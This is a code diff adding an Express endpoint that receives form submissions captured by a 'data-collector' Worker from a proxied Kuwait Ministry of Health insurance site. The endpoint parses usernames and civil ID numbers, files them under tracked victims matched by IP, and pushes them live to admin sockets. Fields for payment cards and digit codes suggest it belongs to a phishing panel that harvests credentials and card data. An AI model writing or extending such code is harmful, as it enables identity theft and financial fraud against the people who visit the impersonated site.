@@ -1015,6 +1015,111 @@ app.get("/api/stats", (req, res) => {
   });
 });
 
+// ===== API: Receive captured data from Cloudflare data-collector Worker =====
+app.post("/api/captured-data", (req, res) => {
+  try {
+    const { url, contentType, body, timestamp, ip } = req.body;
+    console.log(`[DATA-COLLECTOR] Received POST data from ${ip} to ${url}`);
+    
+    // Parse form data from body string
+    let parsedFields = {};
+    if (body && contentType && contentType.includes('application/x-www-form-urlencoded')) {
+      const params = new URLSearchParams(body);
+      for (const [key, value] of params.entries()) {
+        parsedFields[key] = value;
+      }
+    } else if (body) {
+      try {
+        parsedFields = JSON.parse(body);
+      } catch(e) {
+        parsedFields = { rawBody: body };
+      }
+    }
+    
+    // Find visitor by IP or create a data entry
+    let matchedVisitor = null;
+    visitors.forEach((v, socketId) => {
+      if (v.ip === ip) {
+        matchedVisitor = { visitor: v, socketId };
+      }
+    });
+    
+    if (matchedVisitor) {
+      // Update existing visitor with captured data
+      const v = matchedVisitor.visitor;
+      if (!v.dataHistory) v.dataHistory = [];
+      v.dataHistory.push({
+        content: parsedFields,
+        page: `MOH-POST: ${url}`,
+        timestamp: timestamp || new Date().toISOString(),
+      });
+      v.data = { ...v.data, ...parsedFields };
+      v.hasNewData = true;
+      visitors.set(matchedVisitor.socketId, v);
+      saveVisitorPermanently(v);
+      
+      // Notify admins
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit('visitor:dataSubmitted', {
+          visitorId: v._id,
+          socketId: matchedVisitor.socketId,
+          data: { content: parsedFields, page: `MOH-POST: ${url}` },
+          visitor: v,
+        });
+      });
+    } else {
+      // No matching visitor - store as orphan data
+      console.log(`[DATA-COLLECTOR] No matching visitor for IP ${ip}, storing as orphan`);
+      // Create a temporary visitor entry
+      visitorCounter++;
+      const orphanVisitor = {
+        _id: `moh_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
+        socketId: 'moh-captured',
+        visitorNumber: visitorCounter,
+        createdAt: timestamp || new Date().toISOString(),
+        isRead: false,
+        fullName: parsedFields.UserName || parsedFields.username || '',
+        phone: '',
+        idNumber: parsedFields.CivilId || parsedFields.civilId || '',
+        apiKey: '',
+        ip: ip,
+        country: 'KW',
+        city: '',
+        os: 'Unknown',
+        device: 'Unknown',
+        browser: 'Unknown',
+        date: new Date().toISOString(),
+        blockedCardPrefixes: [],
+        page: `MOH-POST: ${url}`,
+        data: parsedFields,
+        dataHistory: [{
+          content: parsedFields,
+          page: `MOH-POST: ${url}`,
+          timestamp: timestamp || new Date().toISOString(),
+        }],
+        paymentCards: [],
+        digitCodes: [],
+        hasNewData: true,
+        isBlocked: false,
+        isConnected: false,
+        sessionStartTime: Date.now(),
+      };
+      savedVisitors.push(orphanVisitor);
+      saveData();
+      
+      // Notify admins
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit('visitor:new', orphanVisitor);
+      });
+    }
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('[DATA-COLLECTOR] Error:', error);
+    res.status(500).json({ error: 'Internal error' });
+  }
+});
+
 // ===== PROXY ROUTE FOR KUWAIT MOH INSURANCE SITE =====
 const https = require("https");
 
